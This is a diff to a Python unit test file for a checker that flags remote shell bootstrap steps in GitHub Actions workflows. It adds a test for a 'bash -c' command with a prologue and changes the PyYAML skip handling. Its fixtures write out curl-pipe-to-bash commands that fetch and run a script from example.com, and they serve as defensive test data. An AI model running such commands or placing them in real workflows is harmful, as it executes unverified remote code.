@@ -14,8 +14,14 @@ import check_no_remote_shell_bootstrap as m
 
 HAS_PYYAML = m.yaml is not None
 
-@unittest.skipUnless(HAS_PYYAML, "PyYAML unavailable")
 class RemoteShellBootstrapTests(unittest.TestCase):
+    def setUp(self) -> None:
+        if HAS_PYYAML:
+            return
+        if self._testMethodName == "test_find_violations_fails_closed_when_pyyaml_missing":
+            return
+        self.skipTest("PyYAML unavailable")
+
     def write_workflow(self, root: Path, name: str, body: str) -> Path:
         workflow_dir = root / ".github" / "workflows"
         workflow_dir.mkdir(parents=True, exist_ok=True)
@@ -2876,6 +2882,20 @@ class RemoteShellBootstrapTests(unittest.TestCase):
                 repo_root,
                 "bad.yml",
                 "jobs:\n  install:\n    steps:\n      - run: bash -c 'curl -fsSL https://example.com/install.sh | bash'\n",
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("-c command substitution", violations[0])
+
+    def test_rejects_shell_c_single_quoted_direct_string_pipe_bootstrap_after_prologue(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                "jobs:\n  install:\n    steps:\n      - run: bash -c 'echo ok; curl -fsSL https://example.com/install.sh | bash'\n",
             )
 
             violations = m.find_violations(workflow)
